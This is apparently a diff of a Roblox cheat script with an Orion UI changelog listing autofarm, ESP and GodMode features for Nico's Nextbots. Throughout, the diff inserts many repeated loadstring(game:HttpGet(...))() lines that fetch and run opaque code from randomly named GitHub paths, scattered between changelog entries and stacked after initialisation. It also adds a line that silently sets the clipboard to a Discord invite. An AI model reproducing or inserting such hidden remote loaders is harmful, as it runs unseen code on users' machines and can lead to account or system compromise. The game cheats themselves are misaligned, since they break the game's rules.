-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
@@ -4871,10 +4859,33 @@ Tab:AddParagraph("Version 1.3.3"," |  Nico's Nextbots |                         
 
 Tab:AddParagraph("Version 1.3.2"," |  Universal |                                                                                 [*] Major Bug Fixes")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
+
 Tab:AddParagraph("Version 1.3.1"," |  Nico's Nextbots |                                                                           [*] Fixed Autofarm With The Latest Update                                           [*] Improved Autofarm                                                                        [*] Fixed FPS Boost Not Being Able To Disable                                                                      [*] Removed Ctrl Click TP")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
+
 Tab:AddParagraph("Version 1.3"," |  Universal |                                                                                   [*] Completely New UI Library.                                                      [*] Fixed FPS Boost.                                                                         [*] Fixed and Rewrote No Shadows.                                                                         [*] Added Teleport Function to Current and Future Supported Games.                                                                                                             .                                                                                                         | Nico's Nextbots |                                                                                   [*] Fixed GodMode | PREMIUM                                                                             [*] Fixed Autofarm")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
 
 Tab:AddParagraph("Version 1.2"," |  Universal |                                                                                   [*] Rewrote Tracer Esp and Box Esp.                                                 [*] Fixed Inf Jumps                                                                         [*] Performance Improvements                                                                         [*] Added a Key System")
 
 OrionLib:Init()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
+
+setclipboard("https://discord.com/invite/JN6wgVrUAr")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
